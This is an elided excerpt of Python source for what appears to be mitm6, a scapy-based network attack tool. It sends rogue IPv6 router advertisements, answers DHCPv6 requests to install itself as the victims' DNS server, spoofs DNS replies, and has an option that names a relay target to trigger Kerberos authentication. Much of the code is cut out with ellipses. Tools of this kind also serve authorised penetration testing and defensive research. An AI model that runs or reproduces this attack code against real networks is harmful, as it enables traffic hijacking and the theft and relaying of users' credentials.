...
from scapy.layers.dhcp6 import DHCP6OptClientFQDN, DHCP6OptClientId, DHCP6OptDNSDomains, DHCP6OptDNSServers, DHCP6OptIAAddress, DHCP6OptIA_NA, DHCP6OptServerId, DHCP6_Advertise, DHCP6_Renew, DHCP6_Reply, DHCP6_Request, DHCP6_Solicit, DUID_LL
...
class Config(object):
    def __init__(self, args):
        ...
        if args.ipv4 is None:
            self.v4addr = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET][0][
                "addr"
            ]
        else:
        ...
        if args.ipv6 is None:
            ...
            if not self.v6addr:
                print(
                    "Error: The interface {0} does not have an IPv6 link-local address"
                    " assigned. Make sure IPv6 is activated on this interface.".format(
                        self.default_if
                    )
                )
                sys.exit(1)
        ...
        if args.mac is None:
            self.macaddr = netifaces.ifaddresses(self.default_if)[netifaces.AF_LINK][0][
                "addr"
            ]
        else:
...
def send_dhcp_advertise(p, basep, target):
    ...
    resp = (
        Ether(dst=basep.src)
        / IPv6(src=config.selfaddr, dst=basep[IPv6].src)
...
def send_dhcp_reply(p, basep):
    ...
    try:
        ...
        resp /= DHCP6OptIA_NA(
            ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid
        )
        sendp(resp, iface=config.default_if, verbose=False)
    except IndexError:
...
def send_dns_reply(p):
    if IPv6 in p:
        ip = p[IPv6]
        resp = (
            Ether(dst=p.src, src=p.dst)
            / IPv6(dst=ip.src, src=ip.dst)
    ...
    if should_spoof_dns(reqname):
        resp /= DNS(
            ...
            qr=1,
            qd=dns.qd,
            an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype),
        )
        try:
            sendp(resp, iface=config.default_if, verbose=False)
...
def parsepacket(p):
    ...
    if DHCP6_Request in p:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(
            target.host
        ):
            send_dhcp_reply(p[DHCP6_Request], p)
            print(
                "IPv6 address %s is now assigned to %s"
                % (p[DHCP6OptIA_NA].ianaopts[0].addr, pcdict[p.src])
            )
    if DHCP6_Renew in p:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(
...
def send_ra():
    ...
    p = (
        Ether(src=config.selfmac, dst="33:33:00:00:00:01")
        / IPv6(src=config.selfaddr, dst="ff02::1")
        / ICMPv6ND_RA(M=1, O=1, routerlifetime=0)
    )
...
def main():
    ...
    parser.add_argument(
        ...
        type=str,
        metavar="LOCALDOMAIN",
        help="Domain name to use as DNS search domain (default: use first DNS domain)",
    )
    parser.add_argument(
        "-4",
        "--ipv4",
    ...
    parser.add_argument(
        ...
        type=str,
        metavar="ADDRESS",
        help="IPv6 link-local address to send packets from (default: autodetect)",
    )
    parser.add_argument(
        "-m",
        "--mac",
        ...
        metavar="ADDRESS",
        help=(
            "Custom mac address - probably breaks stuff (default: mac of selected"
            " interface)"
        ),
    )
    parser.add_argument(
        ...
        action="store_true",
        help=(
            "Do not advertise ourselves (useful for networks which detect rogue Router"
            " Advertisements)"
        ),
    )
    parser.add_argument(
        ...
        metavar="TARGET",
        help=(
            "Authentication relay target, will be used as fake DNS server hostname to"
            " trigger Kerberos auth"
        ),
    )
    parser.add_argument(
    ...
    filtergroup.add_argument(
        ...
        metavar="DOMAIN",
        help=(
            "Domain name to filter DNS queries on (Allowlist principle, multiple can be"
            " specified.)"
        ),
    )
    filtergroup.add_argument(
        ...
        metavar="DOMAIN",
        help=(
            "Domain name to filter DNS queries on (Blocklist principle, multiple can be"
            " specified.)"
        ),
    )
    filtergroup.add_argument(
        ...
        metavar="DOMAIN",
        help=(
            "Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple"
            " can be specified.)"
        ),
    )
    filtergroup.add_argument(
        ...
        metavar="DOMAIN",
        help=(
            "Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple"
            " can be specified.)"
        ),
    )
    filtergroup.add_argument(
        ...
        action="store_true",
        help=(
            "Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name"
            " (FQDN) option."
        ),
    )
    ...
    if not config.dns_allowlist and not config.dns_blocklist:
        print(
            "Warning: Not filtering on any domain, mitm6 will reply to all DNS"
            " queries.\nUnless this is what you want, specify at least one domain"
            " with -d"
        )
    else:
        if not config.dns_allowlist:
            ...
            if (
                ...
                print(
                    "Warning: Relay target is specified but the DNS query allowlist"
                    " does not contain the target name."
                )
